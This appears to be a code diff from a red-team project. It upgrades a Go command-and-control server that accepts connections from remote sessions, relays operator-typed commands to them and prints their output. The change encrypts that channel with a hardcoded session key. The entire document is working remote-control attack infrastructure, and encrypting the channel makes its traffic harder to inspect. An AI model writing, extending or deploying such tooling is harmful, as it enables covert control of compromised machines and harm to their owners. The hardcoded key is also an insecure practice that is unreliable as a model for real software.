@@ -7,10 +7,14 @@ import (
 	"os"
 	"strings"
 	"sync"
+
+	"redteam-portfolio/pkg/comms"
 )
 
+const sessionKeyHex = "c9e4737ac9b481b70809fc372d13ef97a921c5fea7bfd3773b10b8213986bef3"
+
 var (
-	activeSession net.Conn
+	activeSession *comms.SecureConn
 	mu            sync.Mutex
 )
 
@@ -29,7 +33,6 @@ func main() {
 		fmt.Print("[C2] > ")
 		cmd, _ := reader.ReadString('\n')
 		cmd = strings.TrimSpace(cmd)
-
 		if cmd == "" {
 			continue
 		}
@@ -43,7 +46,9 @@ func main() {
 			continue
 		}
 
-		sess.Write([]byte(cmd + "\n"))
+		if err := sess.WriteMessage([]byte(cmd)); err != nil {
+			fmt.Printf("[C2] Send error: %v\n", err)
+		}
 	}
 }
 
@@ -54,35 +59,43 @@ func acceptLoop(listener net.Listener) {
 			continue
 		}
 
+		sess, err := comms.NewSecureConn(conn, sessionKeyHex)
+		if err != nil {
+			conn.Close()
+			continue
+		}
+
 		mu.Lock()
 		if activeSession != nil {
 			activeSession.Close()
 		}
-		activeSession = conn
+		activeSession = sess
 		mu.Unlock()
 
-		fmt.Printf("[C2] New session: %s\n", conn.RemoteAddr().String())
-		go handleSession(conn)
+		fmt.Printf("[C2] New encrypted session: %s\n", conn.RemoteAddr().String())
+		go handleSession(sess)
 	}
 }
 
-func handleSession(conn net.Conn) {
+func handleSession(sess *comms.SecureConn) {
 	defer func() {
-		conn.Close()
+		sess.Close()
 		mu.Lock()
-		if activeSession == conn {
+		if activeSession == sess {
 			activeSession = nil
 		}
 		mu.Unlock()
-		fmt.Printf("[C2] Session closed: %s\n", conn.RemoteAddr().String())
+		fmt.Println("[C2] Session closed")
 	}()
 
-	scanner := bufio.NewScanner(conn)
-	for scanner.Scan() {
-		line := scanner.Text()
-		if line == "ready" {
+	for {
+		msg, err := sess.ReadMessage()
+		if err != nil {
+			return
+		}
+		if string(msg) == "ready" {
 			continue
 		}
-		fmt.Printf("%s\n", line)
+		fmt.Printf("%s\n", msg)
 	}
 }
